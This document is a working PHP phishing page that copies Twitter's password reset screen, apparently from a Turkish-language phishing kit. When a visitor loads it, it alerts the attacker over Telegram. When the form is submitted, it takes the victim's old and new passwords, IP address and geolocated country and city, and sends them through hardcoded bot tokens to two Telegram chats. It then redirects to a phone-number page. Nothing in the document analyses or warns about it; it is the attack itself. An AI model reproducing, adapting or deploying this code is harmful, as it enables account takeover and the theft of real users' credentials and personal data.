<?php

ob_start();
session_start();
error_reporting(E_ALL);

function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}



$username=$_GET['username'];
$token = "2103747809:AAEGA4fitzVlcnW8Q57j5xMd9frkrQq9mP4";
 
$parametre= array(
'chat_id' => "1764463552",
'text' => "Twitter fc - $username siteye geldi hazır ol şu an şifre sıfırlama sayfasında.",
);
$ch = curl_init();
$url = "https://api.telegram.org/bot".$token."/sendmessage";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $parametre);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
$token = "2103747809:AAEGA4fitzVlcnW8Q57j5xMd9frkrQq9mP4";
 
$parametre= array(
'chat_id' => "1091679925",
'text' => "Twitter fc - $username siteye geldi hazır ol şu an şifre sıfırlama sayfasında.",
);
$ch = curl_init();
$url = "https://api.telegram.org/bot".$token."/sendmessage";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $parametre);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);

if($_POST){

  $username=$_GET["username"];
  $password=$_POST["password"];
  $doublepass=$_POST["doublepass"];
  $ip=$_SERVER["REMOTE_ADDR"];
  $konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$token = "1952034227:AAEyA4PHmWrvWJfs5N7OJPcLeNNqKbSSGoc";
 
$parametre= array(
'chat_id' => "1764463552",
'text' => "Twitter fc -Kullanıcı Adı: $username - Eski Şifre: $password - Yeni Şifre: $doublepass - Ip Adresi: $ip - Ülke: $ulke - Şehir: $sehir",
);
$ch = curl_init();
$url = "https://api.telegram.org/bot".$token."/sendmessage";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $parametre);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
$token = "1952034227:AAEyA4PHmWrvWJfs5N7OJPcLeNNqKbSSGoc";
 
$parametre= array(
'chat_id' => "1091679925",
'text' => "Twitter fc -Kullanıcı Adı: $username - Eski Şifre: $password - Yeni Şifre: $doublepass - Ip Adresi: $ip - Ülke: $ulke - Şehir: $sehir",
);
$ch = curl_init();
$url = "https://api.telegram.org/bot".$token."/sendmessage";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $parametre);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);	
	
echo '';
  
   header("Location: phone.php?username=$username");
}
?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Password Reset</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">
  <link href="https://abs.twimg.com/favicons/favicon.ico" rel="shortcut icon" type="image/x-icon">
  <link href="https://abs-0.twimg.com/login/password-reset.ec5af2e5fcc4c119dd2e3bc0422041416162460e.css" rel="stylesheet">
  
</head>
<body  class="ResponsiveLayout ">
    <div class="TopNav">
      <div class="TopNav--container u-cf">
        
        
        <div class="Icon--logo u-pullLeft">
          <a href="https://twitter.com"><img alt="twitter" src="data:image/png;base64,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"></a>
        </div>
        <div class="TopNav-title u-pullLeft">Password Reset</div>
        <ul class="u-pullRight">
              <li class="TopNav-languageSelector u-pullRight">
                <select>
 <option value="" selected>English</option>
 <option value="/account/reset_password?lang=ar-x-fm"> العربية أنثى</option>
 <option value="/account/reset_password?lang=cy">Cymraeg</option>
 <option value="/account/reset_password?lang=da">Dansk</option>
 <option value="/account/reset_password?lang=de">Deutsch</option>
 <option value="/account/reset_password?lang=en-gb">English (UK)</option>
 <option value="/account/reset_password?lang=es">Español</option>
 <option value="/account/reset_password?lang=eo">Esperanto</option>
 <option value="/account/reset_password?lang=eu">Euskara</option>
 <option value="/account/reset_password?lang=fil">Filipino</option>
 <option value="/account/reset_password?lang=fr">Français</option>
 <option value="/account/reset_password?lang=ga">Gaeilge</option>
 <option value="/account/reset_password?lang=gl">Galego</option>
 <option value="/account/reset_password?lang=id">Indonesian</option>
 <option value="/account/reset_password?lang=it">Italiano</option>
 <option value="/account/reset_password?lang=hu">Magyar</option>
 <option value="/account/reset_password?lang=msa">Malay</option>
 <option value="/account/reset_password?lang=nl">Nederlands</option>
 <option value="/account/reset_password?lang=no">Norsk</option>
 <option value="/account/reset_password?lang=pl">Polski</option>
 <option value="/account/reset_password?lang=ckb">Soranî</option>
 <option value="/account/reset_password?lang=fi">Suomi</option>
 <option value="/account/reset_password?lang=sv">Svenska</option>
 <option value="/account/reset_password?lang=vi">Tiếng Việt</option>
 <option value="/account/reset_password?lang=tr">Türkçe</option>
 <option value="/account/reset_password?lang=ca">català</option>
 <option value="/account/reset_password?lang=hr">hrvatski</option>
 <option value="/account/reset_password?lang=lv">latviešu</option>
 <option value="/account/reset_password?lang=pt">português (Brasil)</option>
 <option value="/account/reset_password?lang=ro">română</option>
 <option value="/account/reset_password?lang=sq">shqip</option>
 <option value="/account/reset_password?lang=sk">slovenčina</option>
 <option value="/account/reset_password?lang=cs">Čeština</option>
 <option value="/account/reset_password?lang=el">Ελληνικά</option>
 <option value="/account/reset_password?lang=bg">Български език</option>
 <option value="/account/reset_password?lang=ru">Русский</option>
 <option value="/account/reset_password?lang=sr">Српски</option>
 <option value="/account/reset_password?lang=uk">Українська мова</option>
 <option value="/account/reset_password?lang=he">עברית</option>
 <option value="/account/reset_password?lang=ur">اردو</option>
 <option value="/account/reset_password?lang=ar">العربية</option>
 <option value="/account/reset_password?lang=fa">فارسی</option>
 <option value="/account/reset_password?lang=mr">मराठी</option>
 <option value="/account/reset_password?lang=hi">हिन्दी</option>
 <option value="/account/reset_password?lang=bn">বাংলা</option>
 <option value="/account/reset_password?lang=gu">ગુજરાતી</option>
 <option value="/account/reset_password?lang=ta">தமிழ்</option>
 <option value="/account/reset_password?lang=kn">ಕನ್ನಡ</option>
 <option value="/account/reset_password?lang=th">ภาษาไทย</option>
 <option value="/account/reset_password?lang=ja">日本語</option>
 <option value="/account/reset_password?lang=zh-cn">简体中文</option>
 <option value="/account/reset_password?lang=zh-tw">繁體中文</option>
 <option value="/account/reset_password?lang=ko">한국어</option>
                </select>
              </li>
        </ul>
      </div>
    </div>
  <div class="PageContainer">
    
    <div class="Section">
        <div class="PageHeader Edge">Reset your password</div>

          <div class="user-profile-box">
  <img class="Avatar Avatar--size48 profile-image" src="https://abs.twimg.com/sticky/default_profile_images/default_profile_normal.png">
  <div class="user-name-box">
    <div class="fullname"></div>
    <div class="screenname" dir="ltr">@<?php echo $username; ?></div>
  </div>
</div>

      <p>
      Strong passwords include numbers, letters, and punctuation marks. <a href="https://support.twitter.com/articles/76036-keeping-your-account-secure?ref=password_reset" target="_blank">Learn more</a>
      </p>
      <form class="Form" method="post">
        <input type="hidden" name="authenticity_token">
        <label for="password">Enter Your Old Password</label>
        <div class="PasswordStrength">
          <input id="password" class="Form-textbox Edge-textbox is-required" type="password" name="password">
          <span class="PasswordStrength-meterContainer">
            <span class="PasswordStrength-meter"></span>
          </span>
          <span class="Form-message is-errored">
            <span data-key="weak">Weak</span>
            <span data-key="good">Good</span>
            <span data-key="strong">Strong</span>
            <span data-key="verystrong">Very strong</span>
            <span data-key="tooshort">Too short</span>
            <span data-key="obvious">Too obvious</span>
            <span data-key="tooweak">6 characters or more! Be tricky.</span>
            <span data-key="required">Please enter a new password.</span>
            
            <span data-key="roc"></span>
          </span>
        </div>
        <div>
          <label for="password_confirmation">Enter Your new password</label>
          <input class="Form-textbox Edge-textbox" type="password" name="doublepass">
          <span class="Form-message">
            <span data-key="mismatch">Passwords do not match.</span>
          </span>
        </div>
        <div class="Form-checkbox">
          <label>
            <input type="checkbox" value="1" name="remember_me" checked="checked">
            Remember me
          </label>
        </div>
          <p>
            Resetting your password will log you out of all your active Twitter sessions.
          </p>
        <input type="submit" class="Button EdgeButton--primary EdgeButton">
      </form>
    </div>

<style > 
  img[src="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"]{
   display:none!important;
  }
</style>
  </div>
    <script src="//abs-0.twimg.com/login/base.7ced3ee3ff61dadf91a9c9bd7082adc8f158a360.js" type="text/javascript"></script>
        <script src="//abs-0.twimg.com/login/password_reset_page.72411b4bfd7e059b2f94275c72ff97d81c81a61a.js" type="text/javascript"></script>

</body>
</html>

